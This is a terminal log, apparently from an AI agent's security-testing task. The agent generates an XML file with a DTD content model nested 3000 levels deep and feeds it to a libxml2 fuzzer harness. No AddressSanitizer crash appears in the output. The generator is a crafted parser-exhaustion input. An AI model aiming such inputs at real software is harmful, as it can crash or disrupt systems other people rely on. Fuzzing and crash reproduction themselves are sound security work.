@@ -1,0 +1,46 @@
+Previous response had warnings:
+WARNINGS: - Extra text detected before JSON object
+- Extra text detected after JSON object
+
+New Terminal Output:
+
+root@e38823cb2484:/# cat << 'EOF' > /tmp/gen.py
+> depth = 3000
+> dtd = '<!ELEMENT root '
+> dtd += '(a|' * depth
+> dtd += 'a'
+> dtd += ')' * depth
+> dtd += '>'
+> xml = f'<!DOCTYPE root [\n{dtd}\n]>\n<root/>'
+> with open('/tmp/test.xml', 'w') as f:
+>     f.write(xml)
+> EOF
+root@e38823cb2484:/# python3 /tmp/gen.py
+root@e38823cb2484:/# /out/libxml2_xml_read_memory_fuzzer /tmp/test.xml > /tmp/crash_output.txt 2>&1
+root@e38823cb2484:/# grep AddressSanitizer /tmp/crash_output.txt
+root@e38823cb2484:/#
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
